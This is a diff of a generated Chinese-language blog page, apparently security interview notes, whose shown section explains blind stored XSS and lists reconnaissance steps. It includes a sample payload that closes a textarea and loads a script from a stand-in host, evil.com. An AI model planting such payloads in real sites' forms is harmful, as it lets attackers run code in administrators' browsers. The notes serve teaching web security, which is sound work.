@@ -220,7 +220,7 @@
         <h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>一共十道简答题。</p>
 <h1 id="1-XSS盲打"><a href="#1-XSS盲打" class="headerlink" title="1.XSS盲打"></a>1.XSS盲打</h1><p>什么是XSS盲打，给出一个payload案例。</p>
 <h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>在“用户留言，意见反馈，联系客服,提交简历”等位置构造XSS，通常为存储型XSS。<br>因为恶意攻击者提交payload之后，无法马上判断攻击是否成功(如果漏洞确实存在，还需要后台管理员阅读到相关信息)，因此称之为盲打。<br>有时候需要用textarea闭合标签，也有时候不需要。比如在”姓名”处的盲打通常不需要，而在一些多行输入的位置通常需要先闭合 textarea.</p>
-<p>举个payload的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://evil.com/evil.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>举个payload的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://evil.com/evil.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><ol>
 <li>域名与二级域名</li>
 <li>各域名相关IP</li>
@@ -359,7 +359,7 @@
         <div class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">442</span>
+              <span class="site-state-item-count">444</span>
               <span class="site-state-item-name">文章</span>
             </a>
           </div>
